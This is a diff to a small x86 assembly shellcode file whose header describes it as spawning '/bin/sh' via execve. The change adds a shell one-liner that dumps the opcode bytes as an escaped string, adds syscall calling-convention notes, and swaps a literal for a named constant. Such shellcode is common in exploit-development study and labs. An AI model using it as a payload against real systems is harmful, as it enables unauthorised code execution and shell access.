@@ -1,8 +1,11 @@
 ; Author: Abhinav Thakur
 ; Email : compilepeace@gmail.com
-;
 ; Description : An execve '/bin/sh' spawning shellcode
+
 ; Compile : yasm -f bin ./shell.asm
+; Harness : for i in $(objdump -d ./shell.o | grep "^ " | cut -f2);do echo -n \\x$i; done
+; x86 system calling convention : eax (syscall number) | ebx ecx edx esi edi ebp
+; x86-64 sys calling convention : rax (syscall number) | rdi rsi rdx rcx r8  r9 
 
 %define SYS_EXECVE  0x0b
 
@@ -22,7 +25,7 @@ _start:
     mov edx, esp            ; edx   --> "\x00\x00\x00\x00"
     push ebx                ; stack --> &("/bin//sh") | 0 | "/bin//sh" | 0 
     mov ecx, esp
-    mov al, 0xb             ; syscall number        
+    mov al, SYS_EXECVE      ; syscall number        
     int 0x80
 
  
